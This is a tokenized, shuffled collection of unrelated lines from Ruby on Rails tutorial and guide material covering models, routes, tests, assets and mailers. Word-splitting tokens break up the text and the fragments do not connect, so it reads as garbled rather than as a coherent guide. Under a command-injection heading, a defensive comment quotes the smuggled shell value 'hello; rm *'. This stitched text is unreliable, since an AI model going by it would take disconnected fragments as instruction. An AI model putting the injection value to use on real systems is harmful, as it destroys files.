▁This ▁\ k ode { index } ▁action ▁has ▁the ▁line ▁\ k ode {@ users ▁= ▁User ▖ all } ▁( Step ~ 3 ▁in ▁Figure ~\ ref { fig : mvc _ detailed }), ▁which ▁as k s ▁the ▁User ▁model ▁to ▁retrieve ▁a ▁list ▁of ▁all ▁the ▁users ▁from ▁the ▁database ▁( Step ~ 4 ), ▁and ▁then ▁place s ▁them ▁in ▁the ▁variable ▁\ k ode {@ users } ▁( pronoun c ed ▁`` at - users '') ▁( Step ~ 5 ) .
▁xml ▖ tag !( "
▁I ' ve ▁ k e p t ▁the ▁\ k ode { : source } ▁key ▁to ▁emphasize ▁the ▁parallel ▁structure ▁with ▁the ▁\ k ode { has \_ many ▁: followed \_ users } ▁association , ▁but ▁you ▁are ▁free ▁to ▁leave ▁it ▁off .
▁You ▁can ▁see ▁which ▁files ▁are ▁in ▁the ▁ staging ▁are a ▁using ▁the ▁\ k ode { status } ▁command :
▁-- ---------------- ----------------
▁S ince ▁users ▁can ' t ▁yet ▁sign ▁up ▁for ▁the ▁sample ▁application ▁through ▁the ▁web --- that ' s ▁the ▁goal ▁of ▁Chapter ~\ ref { cha : sign _ up } --- we ' ll ▁use ▁the ▁Rails ▁console ▁to ▁create ▁a ▁new ▁user ▁by ▁hand .
▁By ▁using ▁the ▁full ▁URL , ▁your ▁links ▁will ▁now ▁work ▁in ▁your ▁email s .
▁The ▁default ▁value ▁is ▁" alt er n ate " .
▁date ▖ beginning _ of _ hour ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 :00:00 ▁+0200 ▁2010
▁By ▁following ▁the ▁example ▁of ▁the ▁\ k ode { hello } ▁action ▁in ▁Listing ~\ ref { code : hello _ action }, ▁add ▁a ▁second ▁action ▁called ▁\ k ode { goodbye } ▁that ▁render s ▁the ▁text ▁`` goodbye , ▁world !'' .
▁ prev _ week ▁( last _ week )
▁ Library ▁assets ▁such ▁as ▁c ascad ing ▁style ▁ sheet s ▁( CSS ), ▁JavaScript ▁files , ▁and ▁images
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : test _ helper _ digest }
▁Here ▁we ' ve ▁taken ▁care ▁to ▁run ▁the ▁test ▁suite ▁before ▁ deploying , ▁which ▁is ▁a ▁good ▁ha bit ▁to ▁develop .
▁### ▁` re where `
▁* ▁` config ▖ assets ▖ prefix ` ▁defines ▁the ▁prefix ▁where ▁assets ▁are ▁served ▁from ▖
▁That ╼ prev ent s ▁ ar t i ficial ▁construct s ▁like ▁` ! !` ▁or ▁ ter n ar ies , ▁allows ▁refactor s , ▁and ▁the ╼ code ▁does ▁not ▁need ▁to ▁rely ▁on ▁the ▁exact ▁values ▁returned ▁by ▁methods ▁being ▁called ╼ in ▁the ▁implementation .
▁As ▁discuss ed ▁in ▁more ▁ de p th ▁in ▁Section ~\ ref { sec : comments _ for _ various _ reader s }, ▁web ▁development ▁is ▁a ▁challenging ▁subject , ▁es pecially ▁for ▁complete ▁beginners .
▁R ight ▁now ▁there ▁are ▁a ▁h un d r ed , ▁which ▁is ▁already ▁a ▁reason ably ▁large ▁number , ▁and ▁on ▁a ▁real ▁site ▁it ▁could ▁be ▁t housand s .
▁### ▁Command ▁L in e ▁Injection
▁( T hanks ▁to ▁\ href { http :// al ex cha f fe e ▖ com /}{ A le x ▁C ha f fe e } ▁for ▁the ▁suggest ion ▁and ▁code ▁used ▁in ▁this ▁exercise ▖)
▁Expires Active ▁On
▁E x p lo re ▁and ▁document ▁ ed ge ▁cases ▖
▁Create s ▁a ▁ drop d own ▁select ion ▁ box .
▁in ▁Listing ~\ ref { code : remember _ method } .
▁# ▁ ▖ ▖ .
▁Testing ▁for ▁the ▁\ k ode { user ▖ relationships } ▁attribute .
▁<%= ▁ audio _ tag ▁" m us ic ▖ mp 3 " ▁%>
▁* ▁`: minimum ` ▁- ▁The ▁attribute ▁cannot ▁have ▁less ▁than ▁the ▁specified ▁length .
▁The ▁improve d ▁\ k ode { README } ▁file ▁ formatted ▁with ▁ Markdown ▖ ~\ href { http :// railstutorial ▖ org / images / figures / new _ readme _4_0 - full ▖ png }{( full ▁size )}
▁There ▁may ▁be ▁time s ▁when ▁you ▁wish ▁to ▁customize ▁the ▁query ▁used ▁by ▁` has _ one ` ▖
▁G r o up
▁In ▁the ▁process ▁of ▁ putting ▁the ▁new ▁links ▁into ▁the ▁layout , ▁we ' ll ▁take ▁advantage ▁of ▁Bootstrap ' s ▁ability ▁to ▁make ▁ drop d own ▁ menu s , ▁which ▁you ▁can ▁read ▁more ▁about ▁on ▁the ▁\ href { http :// twitter ▖ github ▖ com / bootstrap / components ▖ html } { Bootstrap ▁ components ▁page } .
▁In ▁old er ▁versions ▁of ▁Rails , ▁using ▁this ▁raw ▁SQL ▁used ▁to ▁be ▁the ▁only ▁option ▁to ▁get ▁the ▁desired ▁behavior , ▁but ▁as ▁of ▁Rails ~4▖0 ▁we ▁can ▁use ▁a ▁more ▁natural ▁p ure - Ruby ▁syntax ▁as ▁well :
▁< td > Hello ▁World !
▁ Most ▁of ▁their ▁ st u d ent s ▁start ▁with ▁ limited ▁programming ▁experience ▁but ▁have ▁the ▁ de term in ation ▁and ▁d r ive ▁needed ▁to ▁ pick ▁it ▁up ▁quickly .
▁In ▁design ing ▁a ▁data ▁model , ▁you ▁will ▁some times ▁find ▁a ▁model ▁that ▁should ▁have ▁a ▁relation ▁to ▁itself ▖
▁With ▁that , ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁ ╼ end
▁This ▁means ▁that ▁it ▁will ▁be ▁an ▁un escape d ▁variable ▁directly ▁from ▁a ▁user ▁who ▁may ▁have ▁ malicious ▁in t ent ▖
▁ Google ▁`` < your ▁browser ▁name > ▁ inspect ▁cookies '' ▁to ▁learn ▁how ▁to ▁ inspect ▁the ▁cookies ▁on ▁your ▁system .
▁The ▁uniqueness ▁c a ve at
▁It ▁iterate s ▁through ▁the ▁collection ▁and ▁passes ▁each ▁element ▁to ▁a ▁block ▖
▁ puts ▁' baz '
▁as ▁show n ▁in ▁Listing ~\ ref { code : application _ white list } .
▁ / help
▁Run ▁Command - S h if t - R ▁to ▁verify ▁that ▁the ▁test ▁or ▁test ▁group ▁is ▁red .
▁The ▁name ▁of ▁the ▁scaffold ▁follows ▁the ▁convention ▁of ▁\ emph { models }, ▁which ▁are ▁ singular , ▁rather ▁than ▁resources ▁and ▁controllers , ▁which ▁are ▁plural .
▁Here ▁we ▁could ▁write
▁The ▁scaffold ▁code ▁may ▁have ▁extra ▁new lines ▁compar ed ▁to ▁Listing ~\ ref { code : demo _ microposts _ resource } .
▁And ▁a ▁ bang ▁version ▁` reverse _ merge !` ▁that ▁perform s ▁the ▁merge ▁in ▁place :
▁" Product "▖ underscore ▁# ▁=> ▁" product "
▁( This ▁comment - out ▁technique ▁is ▁also ▁useful ▁when ▁re s c u ing ▁an ▁application ▁who se ▁application ▁code ▁is ▁already ▁written ▁but --- \ href { http :// en ▖ w i k tion ary ▖ org / wiki / q ue ll e _ h or re ur }{\ emph { q ue ll e ▁h or re ur !} } --- has ▁no ▁tests ▖)
▁# ▁* ▁< tt > : allow _ nil </ tt > ▁- ▁S k ip ▁validation ▁if ▁attribute ▁is ▁+ nil + .
▁After ▁you ' ve ▁assembl ed ▁your ▁assets , ▁Rails ▁ prepare s ▁them ▁for ▁the ▁site ▁template ▁by ▁running ▁them ▁through ▁sever al ▁pre process ing ▁engines ▁and ▁using ▁the ▁manifest ▁files ▁to ▁combine ▁them ▁for ▁ delivery ▁to ▁the ▁browser .
▁Note ▁also ▁that ▁the ▁following / follower ▁count s ▁are ▁calculat ed ▁through ▁the ▁associations ▁using
▁ Getting ▁through ▁the ▁entire ▁book ▁usually ▁take s ▁\ emph { much } ▁longer ▁than ▁three ▁day s .
▁<%= ▁javascript _ include _ tag ▁" main ", ▁"/ photos / columns " ▁%>
▁scope ( path _ name s : ▁ { ▁new : ▁' ne u ', ▁edit : ▁' be ar be it en ' ▁ }) ▁do
▁The ▁SQL ▁generated ▁by ▁this ▁method ▁look s ▁like ▁this :
▁ NoMethodError : ▁undefined ▁method ▁` palindrome ? '
▁╼╼ ▁% ▁subsection ▁ ssl _ in _ production ▁( end )╼╼ ▁\ subsection { Product ion ▁ webserver } ▁% ▁( fold )╼ ▁\ label { sec : production _ webserver }╼╼
▁[ S e e ▁some ▁examples ▁of ▁ s crubber s ▁here ]( https :// github ▖ com / f la v or j one s / lo of a h # lo of a h s crubber ) .
▁But ▁the ▁problem ▁ li es ▁within ▁the ▁total ▁number ▁of ▁queries ▁executed ▖
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / indifferent _ access ▖ rb ` .
▁The ▁ answer ▁is ▁that ▁it ▁is ▁possible ▁to ▁tell ▁whether ▁a ▁user ▁is ▁new ▁or ▁already ▁exists ▁in ▁the ▁database ▁via ▁Active ▁Record ' s ▁\ k ode { new \_ record ?}\ ▁boolean ▁method :
▁Ruby ▁E nterprise ▁ Edit ion ▁has ▁these ▁ fixed ▁since ▁the ▁release ▁of ▁1▖8▖7 - 20 10 ▖ 02 ▖
▁# ▁=> ▁< input ▁id =" d ob " ▁name =" d ob " ▁type =" date " ▁/>
▁** Adding ** ▁` Article # time _ since _ created ` ▁and ▁** Overriding ** ▁` Article # summary `:
▁#### ▁ Updating ▁pull ▁request
▁This ▁means ▁that ▁there ▁are ▁methods ▁in ▁Rails ▁with ▁` public ` ▁ v is i b i l ity ▁that ▁are n ' t ▁mean t ▁for ▁user ▁con sum p tion .
▁redirect _ to ▁: back
▁Un like ▁the ▁Capybara ▁\ k ode { page } ▁object , ▁\ k ode { response } ▁let s ▁us ▁test ▁for ▁the ▁server ▁response ▁itself , ▁in ▁this ▁case ▁verify ing ▁that ▁the ▁\ k ode { update } ▁action ▁respond s ▁by ▁redirect ing ▁to ▁the ▁signin ▁page :
▁A ▁test ▁for ▁the ▁reject ion ▁of ▁duplicate ▁email ▁addresses ▖
▁The ▁correspond ence ▁between ▁pages ▁and ▁URLs ▁for ▁the ▁Users ▁resource .
▁So ▁the ▁real ▁question ▁should ▁have ▁been , ▁`` C an ▁a ▁site ▁built ▁with ▁Rails ▁ scale ? ''
▁ Default ▁is ▁`: number ` .
▁Use ▁of ▁the ▁Rails ▁`` default ▁ stack '' , ▁including ▁the ▁built - in ▁M in i Test ▁testing ▁framework
▁<%= ▁link _ to ▁' welcome ', ▁ welcome _ path ▁%>
▁More ▁common ly ▁for ▁dynamic ▁site s , ▁the ▁controller ▁interact s ▁with ▁a ▁\ emph { model }, ▁which ▁is ▁a ▁Ruby ▁object ▁that ▁represent s ▁an ▁element ▁of ▁the ▁site ▁( such ▁as ▁a ▁user ) ▁and ▁is ▁in ▁charg e ▁of ▁communicat ing ▁with ▁the ▁database .
▁< div ▁id =" error _ explanation ">
▁creates ▁ s even ▁different ▁routes ▁in ▁your ▁application , ▁all ▁m app ing ▁to ▁the ▁` Photos ` ▁controller :
▁<% ▁if ▁@ part ▖ assemblies ▖ empty ?
▁The ▁Microposts ▁controller ▁itself ▁appears ▁in ▁schematic ▁form ▁Listing ~\ ref { code : demo _ microposts _ controller } .
▁As ▁required , ▁the ▁test ▁initially ▁fails :
▁If , ▁ de s p ite ▁the ▁c hallenge s ▁involve d , ▁you ▁would ▁ still ▁prefer ▁to ▁complete ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁using ▁a ▁local ▁development ▁environment , ▁I ▁recommend ▁following ▁the ▁instructions ▁at ▁\ href { http :// install rails ▖ com /}{ InstallRails ▖ com }
▁By ▁the ▁way , ▁we ' re ▁now ▁in ▁a ▁position ▁to ▁understand ▁the ▁line ▁of ▁Ruby ▁I ▁ th re w ▁into ▁Section ~\ ref { sec : heroku _ commands } ▁to ▁generate ▁random ▁ subdomain s :
▁ dup [ 1 ] [ 2 ] ▁= ▁4
▁ INNER ▁JOIN ▁orders ▁ ON ▁clients ▖ id ▁= ▁orders ▖ client _ id
▁The ▁tests ▁should ▁now ▁pass :
▁For ▁fine r - gr a in ed ▁control , ▁set ▁this ▁to ▁false ▁and ▁implement ▁` local _ request ?` ▁in ▁controllers ▁to ▁specify ▁which ▁requests ▁should ▁provide ▁debugging ▁information ▁on ▁errors .
▁Ruby ▁on ▁Rails ▁is ▁a ▁web ▁development ▁framework ▁written ▁in ▁the ▁Ruby ▁programming ▁language .
▁" Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App ▁| ▁Home "
▁#### # ▁` beginning _ of _ minute `, ▁` end _ of _ minute `
▁@ part ▖ assemblies ▖ destroy (@ assembly 1 )
▁ Adding ▁some ▁t y po gr a ph ic ▁styling .
▁* ▁P er form ▁database ▁operations ▁in ▁an ▁object - or i ent ed ▁ fa sh ion .
▁As ▁show n ▁in ▁Listing ~\ ref { code : home _ root _ route }, ▁this ▁means ▁replacing ▁the ▁generated ▁\ k ode { get } ▁rule ▁from ▁Listing ~\ ref { code : pages _ routes } ▁with ▁the ▁following ▁code :
▁This ▁is ▁due ▁to ▁the ▁` isolate _ namespace ` ▁method ▁called ▁in ╼ the ▁` Blorgh :: Engine ` ▁class ' s ▁definition ▖
▁Here ▁the ▁ regex ▁\ k ode { VALID \_ EMAIL \_ REGEX } ▁is ▁a ▁\ emph { constant }, ▁indicate d ▁in ▁Ruby ▁by ▁a ▁name ▁starting ▁with ▁a ▁cap it al ▁letter .
▁ n ▁this ▁step ▁( Bo x ~\ ref { aside : technical _ sophistication })▖) ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - d f 67 d 8 ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁changing _ the _ layout _ links ▁( end )╼╼ ▁\ subsection { Test ing ▁layout ▁changes } ▁% ▁( fold )╼ ▁\ label { sec : testing _ layout _ change s }╼╼
▁module ▁ ActiveSupport
▁If ▁you ▁want ▁to ▁disable ▁ Turbolinks ▁for ▁certain ▁links , ▁add ▁a ▁` data - no - t ur bo link `╼ attribute ▁to ▁the ▁tag :
▁The ▁ annotate d ▁User ▁model .
▁In ▁the ▁case ▁of ▁a ▁URL ▁like ▁ / users /1 , ▁the ▁value ▁of ▁\ k ode { params [: id ]} ▁is ▁the ▁\ k ode { id } ▁of ▁the ▁corresponding ▁user ▁(\ k ode {1} ~ in ▁this ▁example ) .
▁Un like ▁most ▁introduction s ▁to ▁the ▁command ▁line , ▁which ▁typical ly ▁assume ▁a ▁relative ly ▁high ▁level ▁of ▁technical ▁ sophistication , ▁\ emph { Learn ▁En ough ▁Command ▁L in e ▁to ▁Be ▁D angerous } ▁ assumes ▁no ▁ prerequisites ▁other ▁than ▁general ▁computer ▁ knowledg e ▁( how ▁to ▁ la un ch ▁an ▁application , ▁how ▁to ▁use ▁a ▁web ▁browser , ▁how ▁to ▁\ href { http :// l m gt fy ▖ com / ? q = learn + to + touch + type } { touch ▁type }, ▁etc ▖) .
▁The ▁method ▁` seconds _ since _ midnight ` ▁returns ▁the ▁number ▁of ▁second s ▁since ▁ midnight :
▁A ▁user ▁is ▁signed ▁in ▁if ▁there ▁is ▁a ▁current ▁user ▁in ▁the ▁session , ▁i ▖ e ▖ , ▁if ▁\ k ode { current \_ user } ▁is ▁non - \ k ode { nil } .
▁get ▁' preview ', ▁on : ▁: member
▁ Technical ▁ sophistication
▁# ▁action _ controller / meta l / session _ man age ment ▖ rb
▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } .
▁Un like ▁plain ▁JavaScript ▁files , ▁ JS - ERb ▁files ▁also ▁allow ▁the ▁use ▁of ▁ embedded ▁Ruby , ▁which ▁we ▁apply ▁in ▁the ▁\ k ode { create ▖ js ▖ erb } ▁file ▁to ▁update ▁the ▁follow ▁form ▁with ▁the ▁\ k ode { unfollow } ▁partial ▁( which ▁is ▁what ▁should ▁show ▁after ▁a ▁successful ▁following ) ▁and ▁update ▁the ▁ follower ▁count .
▁#### ▁check _ box
▁Here ▁we ' ve ▁introduce d ▁Capybara ' s ▁\ k ode { have \_ link } ▁method .
▁require ▁" blorgh / engine "
▁On ce ▁you ▁have ▁re s ol ve d ▁all ▁conflicts ▁and ▁made ▁sure ▁all ▁the ▁tests ▁are ▁passing , ▁push ▁your ▁changes ▁and ▁open ▁a ▁separate ▁pull ▁request ▁for ▁your ▁back port ▖
▁render ▁ inline : ▁" xml ▖ p ▁ { ' H or r id ▁ coding ▁practice ! ' } ", ▁type : ▁: builder
▁The ▁console ▁allows ▁us ▁to ▁define ▁methods ▁the ▁same ▁way ▁we ▁did ▁with ▁the ▁\ k ode { home } ▁action ▁from ▁Listing ~\ ref { code : static _ pages _ controller } ▁or ▁the ▁\ k ode { full \_ title } ▁helper ▁from ▁Listing ~\ ref { code : title _ helper } .
▁In ▁this ▁chapter , ▁we ' ll ▁rely ▁on ▁the ▁User ▁model ▁validations ▁from ▁Chapter ~\ ref { cha : modeling _ users } ▁to ▁increase ▁the ▁ o d d s ▁of ▁new ▁users ▁ having ▁valid ▁email ▁addresses .
▁The ▁result ing ▁data ▁model ▁appears ▁in ▁Figure ~\ ref { fig : user _ model _ admin } .
▁But ▁if ▁you ▁do ▁want ▁to ▁re name ▁your ▁application , ▁you ▁can ▁arrange ▁for ▁it ▁to ▁be ▁reason ably ▁secure ▁by ▁using ▁a ▁random ▁or ▁ ob s c ure ▁ subdomain , ▁such ▁as ▁the ▁following :
▁Defaults ▁to ▁` / us r / s bin / sendmail ` ▖ </ li >
▁HTML ▁changes ▁with ▁time ; ▁by ▁explicitly ▁making ▁a ▁ doc type ▁declaration ▁we ▁make ▁it ▁like li er ▁that ▁browsers ▁will ▁render ▁our ▁pages ▁properly ▁in ▁the ▁future .
▁The ▁action ▁' about ' ▁could ▁not ▁be ▁found ▁for ▁StaticPages Controller
▁P us h ▁to ▁your ▁remote :
▁If ▁you ▁want ▁to ▁add ▁a ▁fix ▁to ▁old er ▁versions ▁of ▁Ruby ▁on ▁Rails , ▁you ' ll ▁need ▁to ▁set ▁up ▁and ▁switch ▁to ▁your ▁own ▁local ▁ track ing ▁branch ▖
▁In ▁practice , ▁the ▁URL ▁is ▁usually ▁equivalent ▁to ▁`` the ▁thing ▁you ▁see ▁in ▁the ▁address ▁bar ▁of ▁your ▁browser '' .
▁We ▁do ▁this ▁by ▁first ▁updating ▁our ▁test ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : home _ base _ title _ spec }, ▁which ▁update s ▁the ▁previous ▁title ▁test ▁and ▁add s ▁one ▁to ▁test ▁for ▁the ▁absence ▁of ▁the ▁custom ▁\ k ode {" Home "} ▁string ▁in ▁the ▁title .
▁You ▁can ▁supply ▁a ▁hash ▁of ▁ additional ▁HTML ▁options :
▁The ▁ fragments ▁prefix ed ▁with ▁a ▁ st ar ▁are ▁called ▁" w i ld card ▁segment s " .
▁By ▁default , ▁Active ▁Record ▁uses ▁some ▁naming ▁convention s ▁to ▁find ▁out ▁how ▁the ╼ m app ing ▁between ▁models ▁and ▁database ▁table s ▁should ▁be ▁created ▖
▁This ▁creates ▁` comments ` ▁as ▁a ▁ _ nested ▁resource _ ▁within ▁` articles ` ▖
▁They ▁inherit ▁from ╼` ActionMailer :: Base ` ▁and ▁live ▁in ▁` app / mailers `, ▁and ▁they ▁have ▁ associated ▁views ╼ that ▁appear ▁in ▁` app / views ` .
▁invoke ▁ erb
▁# ▁active _ record / reflection ▖ rb
▁def ▁ acts _ like _ string ?
▁ umerate }╼╼ ▁% ▁subsection ▁a _ working _ follow _ button _ the _ standard _ way ▁( end )╼╼ ▁\ subsection { A ▁working ▁follow ▁button ▁with ▁Ajax } ▁% ▁( fold )╼ ▁\ label { sec : a _ working _ follow _ button _ with _ ajax }╼╼
▁# ▁=> ▁< input ▁type =" email " ▁id =" user _ email " ▁name =" user [ email ] " ▁value ="# {@ user ▖ email } " ▁/>
▁ Validations ▁are ▁not ▁covered ▁on ▁this ▁guide , ▁but ▁let ' s ▁assume ▁for ▁a ▁moment ▁that ▁you ▁te mp or ar ily ▁add
▁# ▁ print s ▁" hello ; ▁ rm ▁* " ▁and ▁does ▁not ▁delete ▁files
▁When ▁a ▁method ▁get s ▁called ▁on ▁the ▁class ▁itself , ▁as ▁in ▁the ▁case ▁of ▁\ k ode { new }, ▁it ' s ▁called ▁a ▁\ emph { class ▁method } .
▁As ▁show n ▁in ▁Listing ~\ ref { code : ssl _ in _ production }, ▁all ▁we ▁need ▁to ▁do ▁is ▁set ▁the ▁\ k ode { config } ▁variable ▁to ▁ force ▁the ▁use ▁of ▁SSL ▁in ▁production .
▁At ▁this ▁point , ▁the ▁test ▁suite ▁should ▁be ▁back ▁to ▁\ passing :
▁A lthough ▁in ▁the ▁actual ▁application ▁we ▁will ▁immediately ▁sign ▁in ▁a ▁new ly ▁created ▁user ▁( th us ▁creating ▁a ▁new ▁remember ▁token ▁as ▁a ▁ side - e ffect ), ▁we ▁don ' t ▁want ▁to ▁rely ▁on ▁this ▁behavior ; ▁a ▁more ▁ r ob us t ▁practice ▁is ▁to ▁ensure ▁that ▁\ emph { ever y } ▁user ▁has ▁a ▁valid ▁remember ▁token ▁right ▁from ▁the ▁start .
▁config ▖ assets ▖ prefix ▁= ▁"/ dev - assets "
▁C ▖ new ( 0, ▁1) ▖ instance _ value s ▁# ▁=> ▁{" x " ▁=> ▁ 0, ▁" y " ▁=> ▁1 }
▁( This ▁is ▁a ▁bit ▁advanced , ▁so ▁don ' t ▁worry ▁too ▁much ▁about ▁the ▁details ▖)
▁This ▁make s ▁the ▁\ k ode { str } ▁argument ▁optional , ▁and ▁if ▁we ▁leave ▁it ▁off ▁it ▁automatically ▁take s ▁the ▁given ▁default ▁value .
▁require ▁' y e t _ another _ engine / engine '
▁config ▖ action _ dispatch ▖ perform _ deep _ munge ▁= ▁false
▁It ▁would ▁be ▁even ▁better ▁if ▁you ▁could ▁include ▁a ▁ unit ▁test ▁that ▁shows ▁how ▁the ▁expected ▁behavior ▁is ▁not ▁occur r ing ▖
▁config ▖ action _ controller ▖ asset _ host ▁= ▁" assets ▖ example ▖ com "
▁User ▖ find _ each ▁do ▁| user |
▁After ▁restart ing ▁the ▁development ▁server ▁to ▁activate ▁the ▁configuration ▁in ▁Listing ~\ ref { code : development _ email _ settings }, ▁we ▁next ▁need ▁to ▁update ▁the ▁User ▁mailer ▁\ emph { preview ▁file }, ▁which ▁was ▁automatically ▁generated ▁in ▁Section ~\ ref { sec : account _ activations _ resource }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s } .
▁The ▁CDN ▁you ▁pro v is ion ed ▁should ▁give ▁you ▁a ▁custom ▁ subdomain ▁for ▁your ▁application ╼ such ▁as ▁` my cdn subdomain ▖ fi ctional - cdn ▖ com ` ▁( note ▁ fi ctional - cdn ▖ com ▁is ▁not ▁a ╼ valid ▁CDN ▁provide r ▁at ▁the ▁time ▁of ▁this ▁writing )▖
▁For ▁example , ▁consider ▁these ▁models :
▁< table >
▁ Data ▁ accessible ▁to ▁the ▁public ▁( e ▖ g ▖ , ▁web ▁browsers ), ▁such ▁as ▁error ▁pages
▁We ▁won ' t ▁be ▁using ▁the ▁\ k ode { example \_ user ▖ rb } ▁file ▁from ▁Section ~\ ref { sec : a _ user _ class }, ▁so ▁I ▁suggest ▁remov ing ▁it :
▁The ▁User ▁model ▁itself ▁appears ▁in ▁Listing ~\ ref { code : demo _ user _ model } ; ▁a lthough ▁it ▁is ▁rather ▁plain , ▁it ▁comes ▁ equ ip ped ▁with ▁a ▁large ▁amount ▁of ▁functionality ▁because ▁of ▁inheritance ▁( Section ~\ ref { sec : inheritance _ hierarchies } ▁and ▁Section ~\ ref { sec : ruby _ classes }) .
▁In ▁this ▁section , ▁we ' ll ▁learn ▁about ▁some ▁Ruby ▁data ▁structure s ▁important ▁for ▁writing ▁Rails ▁applications .
▁name ▖ dasherize ▁: ▁name
▁Path s ▁are ▁t ra v ers ed ▁in ▁the ▁order ▁they ▁occur ▁in ▁the ▁search ▁path ▖
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁StaticPages ▁controller .
▁Tests ▁for ▁the ▁user ▁index ▁page .
▁| ▁PATCH / PUT ▁| ▁ / photos / : id ▁| ▁photos # update ▁| ▁image _ path (: id ) ▁|
▁( where ▁\ k ode { self } ▁refer s ▁to ▁the ▁current ▁user ), ▁but ▁inside ▁the ▁User ▁model ▁the ▁\ k ode { self } ▁keyword ▁is ▁optional ▁on ▁the ▁right - h and ▁ side :
▁The ▁line ar ▁ n ar ra tive ▁is ▁such ▁a ▁great ▁format .
▁* ▁Check s ▁for ▁ IP ▁ s po of ing ▁attacks .
▁gem ▁' rails - deprecated _ sanitizer '
▁* ▁Rails ▁4▖0 ▁has ▁ deprecated ▁` ActiveRecord :: TestCase ` ▁in ▁favor ▁of ▁` ActiveSupport :: TestCase ` .
▁* ▁`: greater _ than _ or _ equal _ to ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁ greater ▁than ▁or ╼ ▁equal ▁to ▁the ▁supplied ▁value ▖
▁In ▁some ▁applications , ▁this ▁initial ▁implementation ▁m ight ▁be ▁good ▁enough ▁for ▁most ▁practical ▁purposes , ▁but ▁Listing ~\ ref { code : from _ users _ followed _ by _ first _ cut } ▁isn ' t ▁the ▁final ▁implementation ; ▁see ▁if ▁you ▁can ▁make ▁a ▁guess ▁about ▁why ▁not ▁before ▁mov ing ▁on ▁to ▁the ▁next ▁section .
▁As ▁long ▁as ▁` Sprockets ` ▁respond s ▁to ▁` call ` ▁and ▁returns ▁a ▁` [ status , ▁headers , ▁ body ]` , ▁the ▁route r ▁won ' t ▁know ▁the ▁difference ▁between ▁the ▁Rack ▁application ▁and ▁an ▁action ▖
▁The ▁tests ▁( Listing ~\ ref { code : relationship _ validation _ tests }) ▁and ▁application ▁code ▁( Listing ~\ ref { code : relationship _ validations }) ▁are ▁straightforward .
▁host ▁= ▁config [: host ] ▖ presence ▁|| ▁' localhost '
▁# ▁Rails ▖ root / config ▖ ru
▁### ▁` to _ query `
▁In ▁addition ▁to ▁being ▁a ▁c l ever ▁ ph ra se --- \ emph { new ▁ rel ic } ▁being ▁a ▁con tr ad ic tion ▁in ▁terms --- New ▁Re li c ▁is ▁also ▁an ▁an a gr a m ▁for ▁the ▁name ▁of ▁the ▁ com p any ' s ▁found er , ▁L e w ▁C ir ne .
▁You ▁can ▁supply ▁alter n ate ▁text ▁for ▁the ▁image ▁which ▁will ▁be ▁used ▁if ▁the ▁user ▁has ▁images ▁turn ed ▁off ▁in ▁their ▁browser ▖
▁The ▁method ▁` local _ constant s ` ▁returns ▁the ▁names ▁of ▁the ▁constant s ▁that ▁have ▁been ╼ defined ▁in ▁the ▁receiver ▁module :
▁As ▁with ▁the ▁User ▁scaffold , ▁the ▁scaffold ▁generator ▁for ▁microposts ▁follows ▁the ▁ singular ▁convention ▁of ▁Rails ▁models ; ▁thus , ▁we ▁have ▁\ k ode { generate ▁Micropost } .
▁S end ing ▁email ▁via ▁the ▁user ▁model ▁object .
▁We ' ll ▁be ▁ resizing ▁images ▁using ▁the ▁image ▁ manipulati on ▁program ▁\ href { http :// www ▖ image magic k ▖ org /}{ ImageMagick }, ▁which ▁we ▁need ▁to ▁install ▁on ▁the ▁development ▁environment .
▁All ▁calculat ion ▁methods ▁work ▁directly ▁on ▁a ▁model :
▁#### # ▁` collection ▖ find (▖▖▖)
▁hash [: b ] [: e ] ▁== ▁nil ▁# ▁=> ▁true
▁` Relation ` ▁no ▁longer ▁has ▁m u t at or ▁methods ▁like ▁` # map !` ▁and ▁` # delete _ if ` ▖
▁This ▁will ▁work ▁fine , ▁because ▁both ▁the ▁` Supplier ` ▁and ▁the ▁` Account ` ▁class ▁are ▁defined ▁within ▁the ▁same ▁scope ▖
▁address : ▁ com p any ▖ smtp _ host ▁ }
▁All ▁we ▁need ▁to ▁do ▁is ▁save ▁the ▁user ▁( so ▁it ▁get s ▁an ▁id ) ▁and ▁create ▁an ▁ associated ▁micropost .
▁flash ▖ keys ▁# ▁=> ▁[" string ", ▁: symbol ]
▁See ▁the ▁\ href { http :// get bootstrap ▖ com / components /}{ Bootstrap ▁ components ▁page } ▁for ▁more ▁information .
▁create ▁app
▁The ▁second ▁test ▁first ▁set s ▁the ▁user ' s ▁name ▁to ▁an ▁invalid ▁( blank ) ▁value , ▁and ▁then ▁tests ▁to ▁see ▁that ▁the ▁result ing ▁\ k ode {@ user } ▁object ▁is ▁invalid :
▁After ▁click ing ▁`` Create ▁repository '' , ▁follow ▁the ▁instructions ▁under ▁`` Comm and ▁line ▁> ▁I ▁have ▁an ▁existing ▁project '' , ▁which ▁should ▁look ▁something ▁like ▁Listing ~\ ref { code : bitbucket _ add _ push } .
▁In ▁this ▁context , ▁\ k ode { params [: session ] [: remember \_ me ]} ▁is ▁either ▁\ k ode { ' 0 ' } ▁or ▁\ k ode { ' 1 ' }, ▁both ▁of ▁which ▁are ▁\ k ode { true } ▁in ▁a ▁boolean ▁context , ▁so ▁the ▁result ing ▁expression ▁is ▁\ emph { al way s ▁true }, ▁and ▁the ▁application ▁ acts ▁as ▁if ▁the ▁checkbox ▁is ▁always ▁check ed .
▁A ▁test ▁for ▁user ▁logging ▁in ▁with ▁valid ▁information ▖
▁# ▁=> ▁false
▁Return s ▁the ▁followed ▁user
▁=> ▁true
